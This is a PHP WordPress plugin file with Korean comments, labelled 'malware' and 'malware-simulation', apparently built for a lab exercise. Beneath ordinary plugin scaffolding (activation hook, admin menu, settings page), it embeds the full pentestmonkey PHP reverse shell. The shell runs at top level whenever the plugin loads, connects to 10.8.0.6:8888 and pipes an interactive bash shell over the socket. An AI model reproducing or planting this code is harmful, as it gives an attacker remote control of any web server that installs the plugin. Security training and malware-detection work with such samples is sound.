<?php
/*
Plugin Name: malware
Plugin URI: https://example.com
Description: malware-simulation
Version: 1.0
Author: Your Name
Author URI: https://example.com
License: GPL v2 or later
*/

// 직접 접근 방지
if (!defined('ABSPATH')) {
    exit;
}

// 플러그인 활성화 시 실행되는 함수
register_activation_hook(__FILE__, 'my_test_plugin_activate');
function my_test_plugin_activate() {
    // 활성화 시 필요한 초기 설정
    add_option('my_test_plugin_option', 'default_value');
}

// 관리자 메뉴 추가
add_action('admin_menu', 'my_test_plugin_menu');
function my_test_plugin_menu() {
    add_menu_page(
        '테스트 플러그인', // 페이지 제목
        '테스트 플러그인', // 메뉴 제목
        'manage_options', // 필요한 권한
        'my-test-plugin', // 메뉴 슬러그
        'my_test_plugin_page', // 콜백 함수
        'dashicons-admin-generic' // 아이콘
    );
}

// 관리자 페이지 콘텐츠
function my_test_plugin_page() {
    ?>
    <div class="wrap">
        <h1>테스트 플러그인 설정</h1>
        <form method="post" action="options.php">
            <?php
            settings_fields('my_test_plugin_options');
            do_settings_sections('my-test-plugin');
            submit_button();
            ?>
        </form>
    </div>
    <?php
}
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.0.6';
$port = 8888;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

// 플러그인 비활성화 시 실행되는 함수
register_deactivation_hook(__FILE__, 'my_test_plugin_deactivate');
function my_test_plugin_deactivate() {
    // 비활성화 시 필요한 정리 작업
    delete_option('my_test_plugin_option');
} 


